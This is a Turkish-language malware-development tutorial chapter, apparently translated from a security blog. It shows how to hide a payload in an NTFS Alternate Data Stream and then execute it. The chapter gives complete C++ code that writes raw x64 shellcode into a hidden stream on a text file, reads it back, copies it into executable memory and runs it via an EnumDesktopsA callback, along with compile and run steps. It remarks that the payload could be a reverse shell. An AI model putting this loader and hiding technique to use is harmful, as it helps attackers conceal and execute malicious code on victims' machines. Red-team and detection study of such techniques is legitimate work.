\newpage
\subsection{46. zararlı yazılım geliştirme tekniği. payload’u alternatif veri akışlarında (ADS) saklama. Basit C++ örneği.}

﷽

![hack](./images/105/2023-07-27_04-58.png){width="80%"}      

Bugün, bu yazı alternatif veri akışlarında (ADS) zararlı verileri saklama ve saldırganların bunu kalıcılık için nasıl kullandığına dair yaptığım araştırmanın bir sonucudur.     

### alternatif veri akışları (ADS)

Alternatif Veri Akışları, tek bir dosya adına birden fazla veri "akışının" bağlanmasına izin verir ve bu özellik, meta verileri saklamak için kullanılabilir. Bu özellik başlangıçta *Macintosh Hierarchical File System (HFS)* için tasarlanmış olup, ikonlar ve diğer dosya bilgilerini saklamak amacıyla kaynak çatalı (resource fork) kullanımını destekler. Ancak, veri ve zararlı kod gizlemek amacıyla da kullanılabilir ve kullanılmaktadır.     

### pratik örnek

Aşağıda, payload’u ADS içinde saklamaya dair basit bir örnek kod bulunmaktadır (`hack.c`):     

```cpp
/*
hack.c
malware store data in alternate data streams
author: @cocomelonc
https://cocomelonc.github.io/malware/2023/07/26/malware-tricks-35.html
*/
#include <windows.h>
#include <stdio.h>

int main() {
  // name of the file to which we'll attach the ADS
  char* filename = "C:\\temp\\meow.txt";

  // name of the ADS
  char* streamname = "hiddenstream";

  // full path including the ADS
  char fullpath[1024];
  sprintf(fullpath, "%s:%s", filename, streamname);

  // the data we're going to write to the ADS
  // meow-meow messagebox
  unsigned char my_payload[] =
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

  printf("original payload: ");
  for (int i = 0; i < sizeof(my_payload); i++) {
    printf("%02x ", my_payload[i]);
  }
  printf("\n\n");

  // write data to the ADS
  HANDLE hFile = CreateFile(fullpath, GENERIC_WRITE, 0, NULL, 
  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  printf(hFile == INVALID_HANDLE_VALUE ? "unable to open file!\n" : 
  "successfully write payload data to the ADS\n");
  DWORD bw;
  WriteFile(hFile, my_payload, sizeof(my_payload) - 1, &bw, NULL);
  CloseHandle(hFile);

  // now read the data back
  hFile = CreateFile(fullpath, GENERIC_READ, 0, NULL, 
  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  printf(hFile == INVALID_HANDLE_VALUE ? "unable to open file!\n" : 
  "successfully read payload data from file\n");

  unsigned char data[sizeof(my_payload) - 1];
  DWORD br;
  ReadFile(hFile, data, sizeof(data), &br, NULL);
  CloseHandle(hFile);

  printf("read from file, payload:\n");
  for (int i = 0; i < sizeof(data); i++) {
    printf("%02x ", data[i]);
  }
  printf("\n\n");

  LPVOID mem = VirtualAlloc(NULL, sizeof(data), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, data, sizeof(data));
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
  return 0;
}
```

Mantık oldukça basittir. Bu kod, verileri bir ADS içine yazar ve ardından tekrar okur. Daha sonra payload verisini [EnumDesktopsA](https://cocomelonc.github.io/tutorial/2022/06/27/malware-injection-20.html) işlevi aracılığıyla yürütür.    

Her zamanki gibi, basitlik adına `meow-meow` mesaj kutusunu kullandım:    

```cpp
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";
```

Bu kod, belirtilen dosya üzerinde `hiddenstream` adlı bir ADS oluşturur ve payload verimizi içine yazar. Daha sonra veriyi geri okur ve doğruluğunu kontrol etmek için ekrana yazdırır.Gerçek dünyada, bu veri ters bağlantı (reverse shell) gibi kötü amaçlı bir çalıştırılabilir dosya veya başka bir shellcodeolabilir. Bu durumda, verinin geçici bir konuma çıkarılması ve ayrı bir şekilde çalıştırılması gerekir.     

### demo

Haydi, bu mantığı çalışırken görelim.     

Derleyelim:     

```bash
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-s -ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

![hack](./images/105/2023-07-27_04-59.png){width="80%"}      

Ardından, test kurban dosyamız `meow.txt` dosyasını `C:\temp\` dizinine taşıyalım:     

![hack](./images/105/2023-07-27_23-22.png){width="80%"}      

En son olarak şunu çalıştıralım:      

```powershell
.\hack.exe
```

![hack](./images/105/2023-07-27_23-21.png){width="80%"}      

Alternatif veri akışlarını kontrol etmek için şu komutu kullanabiliriz:      

```powershell
Get-Item -Path C:\temp\meow.txt -Stream *
```

![hack](./images/105/2023-07-27_23-24_1.png){width="80%"}      

![hack](./images/105/2023-07-27_23-24.png){width="80%"}      

Gördüğünüz gibi, her şey beklendiği gibi çalıştı! =^..^=    

Alternate Data Streams (ADS) özelliğinin yalnızca `NTFS`'ye özgü olduğunu unutmayın, `FAT32`, `exFAT`, `ext4` (Linux tarafından kullanılan) gibi diğer dosya sistemleri bu özelliği desteklemez.     

Bu kod yürütme yöntemi genellikle [APT29](https://attack.mitre.org/groups/G0016) ve [APT32](https://attack.mitre.org/groups/G0050) tarafından, [PowerDuke](https://attack.mitre.org/software/S0139) gibi yazılımlar tarafından kullanılır.    

Umarım bu gönderi, mavi takım üyelerinin bu ilginç zararlı yazılım geliştirme tekniği hakkında farkındalık kazanmasına yardımcı olur ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.      

[T1564.004 - Hide Artifacts: NTFS File Attributes](https://attack.mitre.org/techniques/T1564/004/)      
[APT29](https://attack.mitre.org/groups/G0016)     
[APT32](https://attack.mitre.org/groups/G0050)     
[malpedia: APT29](https://malpedia.caad.fkie.fraunhofer.de/actor/apt29)     
[malpedia: APT32](https://malpedia.caad.fkie.fraunhofer.de/actor/apt32)      
[PowerDuke](https://attack.mitre.org/software/S0139)      
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2023-07-26-malware-trick-35)           
